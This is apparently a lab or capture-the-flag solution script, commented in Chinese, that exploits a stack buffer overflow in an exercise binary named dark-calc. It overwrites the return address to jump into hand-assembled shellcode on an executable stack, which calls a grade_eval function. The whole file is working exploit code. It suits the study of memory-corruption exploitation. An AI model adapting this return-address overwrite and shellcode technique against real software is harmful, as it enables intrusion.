#!/usr/bin/env python3
# 任务2：dark-calc 的栈可执行，把 shellcode 写到栈上再跳过去，调用 grade_eval(4)
import struct
import sys


def p64(x):
    return struct.pack("<Q", x)


def p32(x):
    return struct.pack("<I", x)


# 缓冲区只有 16 字节，12 字节的 shellcode 放不下（返回地址还夹在中间），
# 所以放在 0x721000800ff0，正好是返回地址上面那 16 字节。
sc = b"\xbf" + p32(4)                 # mov edi, 4
sc += b"\xb8" + p32(0x401a87)         # mov eax, 0x401a87 (grade_eval)
sc += b"\xff\xd0"                     # call rax

p = b"A" * 16 + b"B" * 8
p += p64(0x721000800ff0)              # 返回地址：跳到 shellcode
p += sc
p += b"\x0f\x0b"                    # ud2，grade_eval 返回后直接结束

# 这里是 call rax 不是 jmp rax：跳转时 rsp%16==0，jmp 进去 grade_eval 的话
# 它里面的 printf 会在 movaps 上崩掉，call 会先压 8 字节返回地址，正好对上。
sys.stdout.buffer.write(p)
